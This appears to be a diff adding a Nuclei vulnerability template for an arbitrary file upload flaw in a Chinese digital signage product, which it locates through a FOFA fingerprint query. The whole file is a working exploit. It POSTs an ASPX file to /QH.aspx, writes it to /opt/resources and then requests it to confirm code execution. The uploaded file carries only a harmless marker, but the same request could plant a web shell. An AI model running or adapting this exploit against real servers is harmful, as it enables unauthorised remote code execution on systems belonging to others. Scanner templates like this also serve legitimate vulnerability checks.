@@ -1,0 +1,49 @@
+id: HF-upload
+info:
+  name: HF-upload
+  author: lengmo
+  severity: critical
+  description: HF-upload
+  tags: HF-upload,rce
+  metadata:
+    fofa-query: app="和丰山海-数字标牌"
+http:
+  - raw:
+      - |
+        POST /QH.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
+ 
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="fileToUpload"; filename="qwe.aspx"
+        Content-Type: application/octet-stream
+ 
+        <% response.write("hello112233") %>
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="action"
+ 
+        upload
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="responderId"
+ 
+        ResourceNewResponder
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="remotePath"
+ 
+        /opt/resources
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+      
+      - |
+        GET /opt/resources/qwe.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 
+
+    
+   
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code ==200 && contains(header, "text/html") && contains(body, "hello112233")'
